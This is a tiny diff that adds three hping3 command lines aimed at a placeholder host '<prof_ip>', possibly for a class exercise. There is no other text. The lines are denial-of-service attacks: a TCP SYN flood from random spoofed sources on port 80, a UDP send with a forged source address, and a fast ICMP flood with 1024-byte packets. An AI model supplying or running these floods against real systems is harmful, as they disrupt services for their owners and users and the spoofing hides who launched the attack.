@@ -1,0 +1,6 @@
+
+hping3 -S --flood --rand-source -p 80 -c 10000 <prof_ip>
+
+hping3 --udp -a <fake_source_ip> -c 9000 --interval u10000 <prof_ip>
+
+hping3 --icmp -c 11000 -d 1024 --fast <prof_ip>
